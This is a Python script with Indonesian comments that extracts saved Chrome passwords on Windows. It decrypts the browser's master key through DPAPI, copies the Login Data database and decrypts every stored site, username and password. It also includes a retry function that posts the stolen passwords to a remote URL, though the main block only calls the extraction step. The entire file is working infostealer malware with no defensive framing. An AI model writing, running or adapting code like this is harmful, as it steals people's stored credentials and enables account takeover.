import os
import json
import base64
import shutil
import sqlite3
import win32crypt
from Crypto.Cipher import AES
from datetime import datetime, timedelta
import requests
import time

LOCAL_STATE_PATH = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Local State")
LOGIN_DATA_PATH = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data")

# Ambil master key dari Local State
def get_master_key():
    with open(LOCAL_STATE_PATH, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return master_key

# Dekripsi password dari database

def decrypt_password(encrypted_password, master_key):
    try:
        if encrypted_password[:3] == b'v10':
            iv = encrypted_password[3:15]
            payload = encrypted_password[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)[:-16]
            return decrypted_pass.decode()
        else:
            return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
    except Exception as e:
        return f"[DecryptError] {e}"

# Ambil semua data login dari Chrome

def get_chrome_passwords():
    try:
        master_key = get_master_key()
        temp_db = os.path.join(os.getenv("TEMP"), "temp_login_data")
        shutil.copy2(LOGIN_DATA_PATH, temp_db)

        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value, date_created FROM logins")
        logins = []

        for origin, username, password, created in cursor.fetchall():
            decrypted_password = decrypt_password(password, master_key)
            date_created = convert_chrome_time(created)
            logins.append({
                "url": origin,
                "username": username,
                "password": decrypted_password,
                "created_at": date_created
            })

        conn.close()
        os.remove(temp_db)
        return logins

    except Exception as e:
        return [{"error": str(e)}]

# Konversi waktu Chrome ke readable

def convert_chrome_time(chrome_time):
    if chrome_time == 0:
        return "N/A"
    try:
        epoch_start = datetime(1601, 1, 1)
        return (epoch_start + timedelta(microseconds=chrome_time)).strftime("%Y-%m-%d %H:%M:%S")
    except:
        return "Invalid"

# Fungsi retry

def send_data_with_retry(url, payload, max_retries=3, delay=2):
    for attempt in range(1, max_retries + 1):
        try:
            r = requests.post(url, json=payload, timeout=5)
            if r.status_code == 200:
                print(f"[✓] Passwords sent on attempt {attempt}")
                return True
        except Exception as e:
            print(f"[!] Retry {attempt} failed: {e}")
        time.sleep(delay)
    print("[✗] Failed to send passwords")
    return False

if __name__ == "__main__":
    get_chrome_passwords()
